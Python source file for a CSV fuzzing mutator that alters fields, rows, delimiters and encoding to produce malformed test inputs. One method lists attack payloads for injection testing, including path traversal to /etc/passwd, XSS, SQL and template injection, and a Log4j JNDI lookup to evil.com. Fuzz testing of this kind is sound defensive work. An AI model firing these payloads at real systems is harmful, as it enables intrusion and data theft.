import csv
import io
import random
from typing import List, Any, Optional

from .base import BaseMutator
from models import InputFormat


class CSVMutator(BaseMutator):
    """
    CSV-specific mutator that maintains CSV structure while applying mutations.
    """

    def __init__(self, sample_data: bytes):
        """
        Initialize CSV mutator with sample data.

        Args:
            sample_data: Original CSV data as bytes
        """
        super().__init__(sample_data, InputFormat.CSV)
        self._parsed_csv = None
        self._delimiter = None
        self._quote_char = None
        self._header = None
        self._parse_csv_structure()

    def _parse_csv_structure(self) -> None:
        """Parse the CSV structure to understand its format."""
        try:
            content = self.original_data.decode("utf-8", errors="ignore")

            dialect = csv.Sniffer().sniff(content.split("\n")[0])
            self._delimiter = dialect.delimiter
            self._quote_char = dialect.quotechar

        except:
            self._delimiter = ","
            self._quote_char = '"'

        self._parse_csv_data()

    def _parse_csv_data(self) -> None:
        """Parse the CSV data into a structured format."""
        try:
            content = self.original_data.decode("utf-8", errors="ignore")
            reader = csv.reader(
                io.StringIO(content),
                delimiter=self._delimiter,
                quotechar=self._quote_char,
            )

            self._parsed_csv = list(reader)

            # Check if first row is a header
            if len(self._parsed_csv) > 1:
                self._header = self._parsed_csv[0]
                self._data_rows = self._parsed_csv[1:]
            else:
                self._header = None
                self._data_rows = self._parsed_csv

        except Exception as e:
            # Fallback: treat each line as a single field
            content = self.original_data.decode("utf-8", errors="ignore")
            self._parsed_csv = [[line] for line in content.split("\n") if line]
            self._header = None
            self._data_rows = self._parsed_csv

    def mutate(self) -> bytes:
        """
        Generate a mutated CSV by applying various mutation strategies.

        Returns:
            Mutated CSV data as bytes
        """
        mutation_type = self.random.choice(
            [
                "field_mutation",
                "row_mutation",
                "structure_mutation",
                "delimiter_mutation",
                "encoding_mutation",
            ]
        )

        if mutation_type == "field_mutation":
            return self._mutate_fields()
        elif mutation_type == "row_mutation":
            return self._mutate_rows()
        elif mutation_type == "structure_mutation":
            return self._mutate_structure()
        elif mutation_type == "delimiter_mutation":
            return self._mutate_delimiters()
        else:  # encoding_mutation
            return self._mutate_encoding()

    def _mutate_fields(self) -> bytes:
        """Mutate individual fields within the CSV."""
        if not self._parsed_csv:
            return self.original_data

        mutated_rows = []

        for row in self._data_rows:
            mutated_row = row.copy()

            num_mutations = self.random.randint(1, min(3, len(mutated_row)))

            for _ in range(num_mutations):
                if mutated_row:
                    field_index = self.random.randint(0, len(mutated_row) - 1)
                    mutated_row[field_index] = self._mutate_field_value(
                        mutated_row[field_index]
                    )

            mutated_rows.append(mutated_row)

        if self._header:
            full_csv = [self._header] + mutated_rows
        else:
            full_csv = mutated_rows

        return self._serialize_csv(full_csv)

    def _mutate_rows(self) -> bytes:
        """Mutate entire rows."""
        if not self._parsed_csv:
            return self.original_data

        mutation_strategy = self.random.choice(
            ["duplicate_row", "delete_row", "modify_row_count", "reorder_rows"]
        )

        if mutation_strategy == "duplicate_row":
            return self._duplicate_random_row()
        elif mutation_strategy == "delete_row":
            return self._delete_random_row()
        elif mutation_strategy == "modify_row_count":
            return self._modify_row_count()
        else:  # reorder_rows
            return self._reorder_rows()

    def _mutate_structure(self) -> bytes:
        """Mutate the overall CSV structure."""
        if not self._parsed_csv:
            return self.original_data

        mutation_strategy = self.random.choice(
            ["column_count_change", "add_header", "remove_header", "malformed_csv"]
        )

        if mutation_strategy == "column_count_change":
            return self._change_column_count()
        elif mutation_strategy == "add_header":
            return self._add_header()
        elif mutation_strategy == "remove_header":
            return self._remove_header()
        else:  # malformed_csv
            return self._create_malformed_csv()

    def _mutate_delimiters(self) -> bytes:
        """Mutate CSV delimiters and separators."""
        if not self._parsed_csv:
            return self.original_data

        alternative_delimiters = [";", "\t", "|", ":"]
        new_delimiter = self.random.choice(alternative_delimiters)

        mutated_rows = []
        for row in self._parsed_csv:
            mutated_row = [str(field) for field in row]
            mutated_rows.append(mutated_row)

        output = io.StringIO()
        writer = csv.writer(output, delimiter=new_delimiter, quotechar=self._quote_char)
        writer.writerows(mutated_rows)

        return output.getvalue().encode("utf-8")

    def _mutate_encoding(self) -> bytes:
        """Apply encoding-related mutations."""
        if not self._parsed_csv:
            return self.original_data

        regular_csv = self._serialize_csv(self._parsed_csv).decode("utf-8")

        encoding_mutations = [
            lambda x: x.replace(",", ", ,"),  # Add extra commas
            lambda x: x.replace('"', '""'),  # Double quotes
            lambda x: x.replace("\n", "\n\n"),  # Extra newlines
            lambda x: x + "," * 10,  # Extra commas at end
            lambda x: "\x00" + x,  # Null byte at start
            lambda x: x + "\x00" * 10,  # Null bytes at end
        ]

        mutated_content = self.random.choice(encoding_mutations)(regular_csv)
        return mutated_content.encode("utf-8", errors="ignore")

    def _mutate_field_value(self, field_value: str) -> str:
        """Mutate a single field value."""
        if not field_value:
            return self.random.choice(["", "NULL", "0", "-1", "999999999"])

        mutation_type = self.random.choice(
            [
                "numeric_edge_cases",
                "string_edge_cases",
                "format_injection",
                "buffer_overflow",
                "empty_value",
            ]
        )

        if mutation_type == "numeric_edge_cases":
            return self._get_numeric_edge_case()
        elif mutation_type == "string_edge_cases":
            return self._get_string_edge_case()
        elif mutation_type == "format_injection":
            return self._get_format_injection()
        elif mutation_type == "buffer_overflow":
            return "A" * self.random.randint(100, 1000)
        else:  # empty_value
            return ""

    def _get_numeric_edge_case(self) -> str:
        """Get a numeric edge case value."""
        edge_cases = [
            "0",
            "-1",
            "1",
            "2147483647",
            "-2147483648",  # 32-bit bounds
            "4294967295",
            "4294967296",  # 32-bit unsigned
            "9223372036854775807",
            "-9223372036854775808",  # 64-bit bounds
            "3.14159",
            "-3.14159",
            "0.0",
            "-0.0",  # Floats
            "inf",
            "-inf",
            "nan",  # Special floats
            "999999999999999999999",
            "0.000000000000001",  # Very large/small
        ]
        return self.random.choice(edge_cases)

    def _get_string_edge_case(self) -> str:
        """Get a string edge case value."""
        edge_cases = [
            "",  # Empty string
            " ",  # Single space
            "\t",  # Tab
            "\n",  # Newline
            "\r",  # Carriage return
            "\0",  # Null character
            "NULL",  # SQL NULL
            "null",  # JSON null
            "undefined",  # JavaScript undefined
            "true",
            "false",  # Boolean values
            "yes",
            "no",  # Yes/no
            "A" * 100,  # Long string
            "🚀🔥💯",  # Unicode emojis
            "café",  # Accented characters
        ]
        return self.random.choice(edge_cases)

    def _get_format_injection(self) -> str:
        """Get a format injection string."""
        injections = [
            "%s%s%s%s",  # Format string
            "%x%x%x%x",  # Hex format
            "%n%n%n%n",  # Write format
            "../../../etc/passwd",  # Path traversal
            '<script>alert("xss")</script>',  # XSS
            "' OR '1'='1",  # SQL injection
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j
        ]
        return self.random.choice(injections)

    def _duplicate_random_row(self) -> bytes:
        """Duplicate a random row in the CSV."""
        if not self._data_rows:
            return self.original_data

        row_to_duplicate = self.random.choice(self._data_rows)
        mutated_rows = self._data_rows.copy()

        # Insert the duplicate at a random position
        insert_position = self.random.randint(0, len(mutated_rows))
        mutated_rows.insert(insert_position, row_to_duplicate)

        if self._header:
            full_csv = [self._header] + mutated_rows
        else:
            full_csv = mutated_rows

        return self._serialize_csv(full_csv)

    def _delete_random_row(self) -> bytes:
        """Delete a random row from the CSV."""
        if not self._data_rows:
            return self.original_data

        if len(self._data_rows) <= 1:
            return self.original_data

        mutated_rows = self._data_rows.copy()
        del mutated_rows[self.random.randint(0, len(mutated_rows) - 1)]

        if self._header:
            full_csv = [self._header] + mutated_rows
        else:
            full_csv = mutated_rows

        return self._serialize_csv(full_csv)

    def _modify_row_count(self) -> bytes:
        """Significantly change the number of rows."""
        if not self._data_rows:
            return self.original_data

        operation = self.random.choice(["expand", "shrink"])

        if operation == "expand":
            multiplier = self.random.randint(2, 10)
            mutated_rows = self._data_rows * multiplier
        else:  # shrink
            keep_fraction = self.random.uniform(0.1, 0.5)
            keep_count = max(1, int(len(self._data_rows) * keep_fraction))
            mutated_rows = self._data_rows[:keep_count]

        if self._header:
            full_csv = [self._header] + mutated_rows
        else:
            full_csv = mutated_rows

        return self._serialize_csv(full_csv)

    def _reorder_rows(self) -> bytes:
        """Reorder rows randomly."""
        if not self._data_rows:
            return self.original_data

        mutated_rows = self._data_rows.copy()
        self.random.shuffle(mutated_rows)

        if self._header:
            full_csv = [self._header] + mutated_rows
        else:
            full_csv = mutated_rows

        return self._serialize_csv(full_csv)

    def _change_column_count(self) -> bytes:
        """Change the number of columns in rows."""
        if not self._data_rows:
            return self.original_data

        operation = self.random.choice(
            ["add_columns", "remove_columns", "mismatch_columns"]
        )

        mutated_rows = []

        for row in self._data_rows:
            mutated_row = row.copy()

            if operation == "add_columns":
                # Add extra columns
                num_to_add = self.random.randint(1, 5)
                for _ in range(num_to_add):
                    mutated_row.append(self._get_string_edge_case())

            elif operation == "remove_columns":
                # Remove some columns
                if len(mutated_row) > 1:
                    num_to_remove = self.random.randint(1, min(3, len(mutated_row) - 1))
                    for _ in range(num_to_remove):
                        if mutated_row:
                            del mutated_row[
                                self.random.randint(0, len(mutated_row) - 1)
                            ]

            else:  # mismatch_columns
                # Create mismatched column counts between rows
                if self.random.random() < 0.5:
                    mutated_row.append(self._get_string_edge_case())
                elif len(mutated_row) > 1:
                    del mutated_row[-1]

            mutated_rows.append(mutated_row)

        if self._header:
            full_csv = [self._header] + mutated_rows
        else:
            full_csv = mutated_rows

        return self._serialize_csv(full_csv)

    def _add_header(self) -> bytes:
        """Add a header if one doesn't exist."""
        if self._header:
            return self.original_data

        if not self._data_rows:
            return self.original_data

        max_columns = max(len(row) for row in self._data_rows)
        header = [f"column_{i}" for i in range(max_columns)]

        full_csv = [header] + self._data_rows
        return self._serialize_csv(full_csv)

    def _remove_header(self) -> bytes:
        """Remove the header if one exists."""
        if not self._header:
            return self.original_data

        return self._serialize_csv(self._data_rows)

    def _create_malformed_csv(self) -> bytes:
        """Create intentionally malformed CSV."""
        if not self._parsed_csv:
            return self.original_data

        malformations = [
            # Unclosed quotes
            lambda x: x.replace('"', ""),
            # Mismatched quotes
            lambda x: x.replace('"', "'") + '"',
            # Extra delimiters
            lambda x: x.replace(self._delimiter, self._delimiter * 2),
            # Missing delimiters
            lambda x: x.replace(self._delimiter, ""),
            # Mixed delimiters
            lambda x: x.replace(
                self._delimiter,
                self._delimiter if x.count(self._delimiter) % 2 == 0 else ";",
            ),
        ]

        content = self._serialize_csv(self._parsed_csv).decode("utf-8")
        malformed_content = self.random.choice(malformations)(content)

        return malformed_content.encode("utf-8", errors="ignore")

    def _serialize_csv(self, csv_data: List[List[str]]) -> bytes:
        """Serialize CSV data back to bytes."""
        output = io.StringIO()
        writer = csv.writer(
            output,
            delimiter=self._delimiter,
            quotechar=self._quote_char,
            quoting=csv.QUOTE_MINIMAL,
        )
        writer.writerows(csv_data)

        return output.getvalue().encode("utf-8")

    def reset(self) -> None:
        """Reset the mutator to its original state."""
        self.current_data = self.original_data
        self.mutation_count = 0
        self._parse_csv_data()

    def _validate_structure(self, data: bytes) -> bool:
        """Validate that data is still valid CSV."""
        try:
            content = data.decode("utf-8")
            csv.reader(io.StringIO(content))
            return True
        except:
            return False

    def generate_mutation_description(self) -> str:
        """Generate a description of the last mutation."""
        if not self._parsed_csv:
            return f"CSV mutation #{self.mutation_count} (no structure detected)"

        row_count = len(self._data_rows)
        col_count = len(self._data_rows[0]) if self._data_rows else 0

        return f"CSV mutation #{self.mutation_count} ({row_count} rows, {col_count} columns)"

    def _increment_mutation_count(self) -> None:
        """Increment the mutation counter and update description."""
        super()._increment_mutation_count()
